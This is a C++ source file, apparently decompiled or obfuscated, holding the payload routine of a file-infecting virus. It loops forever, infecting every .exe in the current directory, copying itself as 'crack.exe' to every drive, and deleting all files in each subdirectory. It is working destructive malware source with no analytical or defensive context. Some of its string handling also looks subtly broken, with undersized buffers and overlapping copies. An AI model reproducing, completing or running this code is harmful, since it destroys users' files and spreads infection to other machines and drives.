#include "data_globals.h"
#pragma optimize("", off)
void Payload(void)
{
    WIN32_FIND_DATAA findDataExe;
    WIN32_FIND_DATAA findDataDir;
    WIN32_FIND_DATAA findDataSub;
    char drivePath[42] = {};
    char tempPath[16] = {};
    char baseDir[160] = {};
    char searchPattern[16] = {};
    char dirCopy[16] = {};
    volatile HANDLE hFindExe_buf[2] = {INVALID_HANDLE_VALUE, (HANDLE)0};
    volatile HANDLE *p_hFindExe = (volatile HANDLE *)&hFindExe_buf[0];
    volatile HANDLE hFindDir_buf[2] = {INVALID_HANDLE_VALUE, (HANDLE)0};
    volatile HANDLE *p_hFindDir = (volatile HANDLE *)&hFindDir_buf[0];
    volatile HANDLE hFindSub_buf[2] = {INVALID_HANDLE_VALUE, (HANDLE)0};
    volatile HANDLE *p_hFindSub = (volatile HANDLE *)&hFindSub_buf[0];
    char* volatile driveIter_buf[2] = {nullptr, (char*)0};
    char* volatile *p_driveIter = (char* volatile *)&driveIter_buf[0];
    volatile size_t driveLen_buf[2] = {0, (size_t)0};
    volatile size_t *p_driveLen = (volatile size_t *)&driveLen_buf[0];

    strncpy(drivePath, "crack.exe", 10);

    do {
        Sleep(5000);

        (*p_hFindExe) = FindFirstFileA("*.exe", &findDataExe);
        if ((*p_hFindExe) != INVALID_HANDLE_VALUE) {
            do {
                Infect(findDataExe.cFileName, VBuffer);
            } while (FindNextFileA((*p_hFindExe), &findDataExe));
            FindClose((*p_hFindExe));
        }

        GetLogicalDriveStringsA(0x400, Drives);
        for ((*p_driveIter) = Drives; *(*p_driveIter) != '\0'; (*p_driveIter) += (*p_driveLen) + 1) {
            strcpy(drivePath + 10, (*p_driveIter));
            strcat(drivePath + 10, drivePath);
            CopyFileA(Virus, drivePath + 10, 0);
            (*p_driveLen) = strlen((*p_driveIter));
        }

        (*p_hFindDir) = FindFirstFileA("*.", &findDataDir);
        if ((*p_hFindDir) != INVALID_HANDLE_VALUE) {
            do {
                if (findDataDir.dwFileAttributes == 0x10) {
                    strcpy(tempPath, baseDir);
                    strcat(tempPath, findDataDir.cFileName);
                    strcpy(searchPattern, tempPath);
                    strcpy(dirCopy, tempPath);
                    (*p_driveLen) = strlen(searchPattern);
                    strncpy(searchPattern + (*p_driveLen), "\\*.*", 5);
                    (*p_hFindSub) = FindFirstFileA(searchPattern, &findDataSub);
                    if ((*p_hFindSub) != INVALID_HANDLE_VALUE) {
                        do {
                            strcpy(tempPath, dirCopy);
                            (*p_driveLen) = strlen(tempPath);
                            tempPath[(*p_driveLen)] = '\\';
                            tempPath[(*p_driveLen) + 1] = '\0';
                            strcat(tempPath, findDataSub.cFileName);
                            DeleteFileA(tempPath);
                        } while (FindNextFileA((*p_hFindSub), &findDataSub));
                        FindClose((*p_hFindSub));
                    }
                }
            } while (FindNextFileA((*p_hFindDir), &findDataDir));
            FindClose((*p_hFindDir));
        }
    } while (true);
}
#pragma optimize("", on)
